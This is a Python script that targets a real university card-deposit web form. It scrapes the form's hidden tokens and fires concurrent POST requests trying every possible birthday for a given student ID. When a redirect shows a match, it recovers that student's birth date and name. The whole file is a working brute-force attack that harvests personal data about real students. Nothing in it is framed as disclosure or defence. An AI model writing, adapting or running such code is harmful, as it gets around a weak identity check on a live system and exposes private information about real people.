from concurrent.futures import as_completed
from requests_futures.sessions import FuturesSession

from dataclasses import dataclass
from textwrap import dedent

from bs4 import BeautifulSoup
import requests
from tqdm import tqdm

from .birthdays import get_all_birthdays, Birthday


CC_BASE_URL = 'https://livingat.wsu.edu/cardinfo/deposit/default.aspx'
CC_DEPOSIT_URL = 'https://livingat.wsu.edu/cardinfo/deposit/depositForm.aspx'

session = FuturesSession()


@dataclass
class Student:
    wsu_id: str
    name: str
    birthday: Birthday

    def __str__(self):
        return dedent(
            f"""\
            Student:
                WSU ID   : {self.wsu_id}
                Name     : {self.name}
                Birthday : {self.birthday}\
            """
        )


def get_hidden_inputs():
    """Scrape hidden CSRF inputs"""
    r = requests.get(CC_BASE_URL)
    bs = BeautifulSoup(r.content, 'html.parser')

    return {
        "__EVENTTARGET": "ctl00$mainContent$btnContinue",
        "__VIEWSTATE": bs.find(id="__VIEWSTATE").get('value'),
        "__EVENTVALIDATION": bs.find(id="__EVENTVALIDATION").get('value'),
    }


def create_request(hidden_inputs, wsu_id, birthday):
    form_data = {
        **hidden_inputs,
        "ctl00$mainContent$txtWSUID": wsu_id,
        "ctl00$mainContent$DropDownListMonth": birthday.month,
        "ctl00$mainContent$DropDownListDay": birthday.day,
    }

    future = session.post(CC_BASE_URL, form_data)
    future.birthday = birthday

    return future


def check_birthday(r) -> bool | str:
    bs = BeautifulSoup(r.content, 'html.parser')

    if not r.history:
        return False
    if CC_DEPOSIT_URL in [*(h.url for h in r.history), r.url]:
        # Hit the jackpot
        if not (name := bs.find(id="ctl00_mainContent_lblName")):
            return True  # Sometimes the page redirects too far
        else:
            return name.text.lstrip(" - ")
    else:
        print(bs.prettify())
        raise RuntimeError("Unexpected page format")


async def get_student_by_id(wsu_id, quiet=False):
    hidden_inputs = get_hidden_inputs()

    all_birthdays = get_all_birthdays()
    checks = [
        create_request(hidden_inputs, wsu_id, birthday)
        for birthday in all_birthdays
    ]

    with tqdm(total=len(all_birthdays), disable=quiet) as progress:
        for i, request in enumerate(as_completed(checks)):
            progress.update(1)

            birthday = request.birthday

            try:
                name = check_birthday(request.result())
            except Exception:
                print(f"Failed on {birthday}")
                raise

            if name:
                if not isinstance(name, str):
                    name = "<Name not rendered, try again>"
                student = Student(wsu_id, name, birthday)
                progress.update(len(all_birthdays) - i - 1)
                break
        else:
            print(f"No results found for {wsu_id}")

    return student
